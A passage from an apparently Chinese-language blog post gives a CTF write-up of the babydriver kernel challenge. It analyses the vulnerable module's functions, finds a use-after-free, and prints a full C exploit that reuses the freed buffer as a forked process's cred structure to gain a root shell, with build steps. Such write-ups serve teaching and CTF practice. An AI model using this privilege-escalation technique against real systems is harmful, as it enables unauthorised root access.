+</span></span><span class="line"><span class="cl">cpio -idvm &lt; ../rootfs.cpio
+</span></span></code></pre></div><p>然后将模块文件复制出来：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">cp ./rootfs/lib/modules/4.4.72/babydriver.ko ./                 
+</span></span></code></pre></div><p>ida 反编译分析：</p>
+<ul>
+<li>分配一个字符设备号<code>babydev_no</code></li>
+<li>初始化<code>cdev</code>结构体</li>
+<li>注册字符设备到内核</li>
+<li>创建<code>/sys/class/babydev</code></li>
+<li>创建<code>/dev/babydev</code>设备节点</li>
+<li>注册失败则清理资源。</li>
+</ul>
+<img src="../assets/image-20251117140932416.png" alt="image-20251117140932416" style="zoom:50%;" />
+<ul>
+<li>babyopen</li>
+</ul>
+<p>申请 0x40 大小的内存，并把地址存在<code>device_buf</code>，<code>device_buf_len=0x40</code>。</p>
+<img src="../assets/image-20251117141457421.png" alt="image-20251117141457421" style="zoom:50%;" />
+<ul>
+<li>babyread</li>
+</ul>
+<p>检查<code>device_buf</code>是否存在，存在则比较其大小和用户读取请求的长度。</p>
+<img src="../assets/image-20251117141342300.png" alt="image-20251117141342300" style="zoom:50%;" />
+<p>但是这里的伪代码是有问题的，<code>copy_to_user</code>的参数没有反编译完整。</p>
+<p><code>copy_to_user</code>的原型：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="nf">copy_to_user</span><span class="p">(</span><span class="kt">void</span> <span class="n">__user</span> <span class="o">*</span><span class="n">to</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">from</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">n</span><span class="p">);</span>
+</span></span></code></pre></div><p>通过快捷键<code>y</code>修改<code>copy_to_user</code>原型添加两个参数类型：</p>
+<p><img alt="image-20251117143247052" decoding="async" loading="lazy" src="../assets/image-20251117143247052.png" style="max-width: 100%; height: auto;"></p>
+<p>修复后的伪代码：</p>
+<p><img alt="image-20251117143226303" decoding="async" loading="lazy" src="../assets/image-20251117143226303.png" style="max-width: 100%; height: auto;"></p>
+<p>所以下面的代码逻辑是：如果<code>device_buf</code>大于用户请求长度，则将<code>device_buf</code>复制用户请求大小的长度到用户态<code>buffer</code>参数中。</p>
+<ul>
+<li>babywrite</li>
+</ul>
+<p><code>copy_to_user</code>的参数同样有问题，使用上面的方法修改一下：</p>
+<img src="../assets/image-20251117144648067.png" alt="image-20251117144648067" style="zoom:50%;" />
+<p>这里可以结合汇编分析出<code>v4</code>的值是从<code>length</code>参数获取的：</p>
+<img src="../assets/image-20251117144844192.png" alt="image-20251117144844192" style="zoom:50%;" />
+<ul>
+<li>babyrelease</li>
+</ul>
+<p>通过<code>kfree</code>释放<code>device_buf</code>，但是这里释放后未将指针置为零，所以存在 UAF 漏洞。</p>
+<img src="../assets/image-20251117141542102.png" alt="image-20251117141542102" style="zoom:50%;" />
+<ul>
+<li>babyioctl</li>
+</ul>
+<p>如果<code>command</code>参数的值等于<code>0x10001</code>，则释放掉<code>device_buf</code>，然后再申请<code>v4</code>大小的<code>device_buf</code>。</p>
+<img src="../assets/image-20251117143741195.png" alt="image-20251117143741195" style="zoom:50%;" />
+<p>就是当用户态调用以下代码时执行：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ioctl<span class="o">(</span>fd, 0x10001, size<span class="o">)</span><span class="p">;</span>
+</span></span></code></pre></div><p><code>v4</code>的值是<code>v3</code>的值，不过<code>v3</code>的值是哪里来的？</p>
+<p>结合汇编分析一下可以发现是从<code>arg</code>参数获取到的。</p>
+<img src="../assets/image-20251117143650644.png" alt="image-20251117143650644" style="zoom:50%;" />
+<h3 id="exp">exp<a hidden class="anchor" aria-hidden="true" href="#exp">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/ioctl.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/wait.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x40</span><span class="p">]</span><span class="o">=</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//open两次设备，分配两个对象
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">int</span> <span class="n">fd1</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/dev/babydev&#34;</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">fd2</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/dev/babydev&#34;</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1">//申请0xa8大小的device_buf，cred结构体大小
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd1</span><span class="p">,</span><span class="mh">0x10001</span><span class="p">,</span><span class="mh">0xa8</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1">//关闭设备，释放fd1的device_buf。
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">close</span><span class="p">(</span><span class="n">fd1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1">//fork分配cred结构体，相当于kmalloc(0xa8)，这样会复用被释放的fd1的device_buf
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//这样fd2的device_buf和新分配的cred结构体就指向同一内核堆空间
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="nf">fork</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">pid</span><span class="o">&lt;</span><span class="mi">0</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;fork error</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">pid</span><span class="o">==</span><span class="mi">0</span><span class="p">){</span> <span class="c1">//判断是否为子进程
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">//覆盖cred结构体。因为堆块重叠，实际覆盖了
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">//直接覆盖子进程的 cred 结构体前 32 字节 → 把 uid/gid 等字段改成 0 → 提权为 root。
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">write</span><span class="p">(</span><span class="n">fd2</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mi">32</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1">//获取root权限后返回一个shell
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span><span class="p">(</span><span class="nf">getuid</span><span class="p">()</span><span class="o">==</span><span class="mi">0</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Hacked</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/sh</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">wait</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">close</span><span class="p">(</span><span class="n">fd2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>编译运行：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">gcc ./exp.c -static -masm<span class="o">=</span>intel -g -o exp    
+</span></span><span class="line"><span class="cl">cp exp rootfs/exp
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> rootfs 
+</span></span><span class="line"><span class="cl">find . -print0 <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="p">|</span> cpio --null -ov --format<span class="o">=</span>newc <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span><span class="p">|</span> gzip -9 &gt; exp.cpio
+</span></span><span class="line"><span class="cl">./gen_cpio.sh core.cpio
+</span></span><span class="line"><span class="cl">mv exp.cpio ..
+</span></span><span class="line"><span class="cl">boot.sh
+</span></span></code></pre></div><p>成功获取 root 权限，然后即可读取 flag。</p>
+<img src="../assets/image-20251117145535870.png" alt="image-20251117145535870" style="zoom:50%;" />
+<h2 id="参考">参考<a hidden class="anchor" aria-hidden="true" href="#参考">#</a></h2>
+<blockquote>
+<p><a href="https://evilpan.com/2020/03/21/linux-slab/#%E5%89%8D%E8%A8%80">Linux内核的内存管理与漏洞利用案例分析 - 有价值炮灰</a></p>
+</blockquote>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<a href="#top" aria-label="go to top" class="top-link" id="top-link">
+    <span class="topInner">
+        <svg class="topSvg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+            <path d="M12 6H0l6-6z" />
+        </svg>
+        <span id="read_progress"></span>
+    </span>
+</a>
+
+<script>
+    
+    document.addEventListener('scroll', function () {
+        const readProgress = document.getElementById("read_progress");
+
+        const scrollTop = window.scrollY;
+        const docHeight = document.documentElement.scrollHeight - window.innerHeight;
+
+        let percent = scrollTop / docHeight;
+        percent = Math.min(Math.max(percent, 0), 1);
+
+        readProgress.innerText = Math.round(percent * 100) + "%";
+    });
+
+    
+    const topBtn = document.getElementById("top-link");
+    window.addEventListener("scroll", function () {
+        if (document.documentElement.scrollTop > 200) {
+            topBtn.style.visibility = "visible";
+            topBtn.style.opacity = "1";
+        } else {
+            topBtn.style.visibility = "hidden";
+            topBtn.style.opacity = "0";
+        }
+    });
+</script>
+<script>
+    
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    });
+</script></body>
+
+</html>
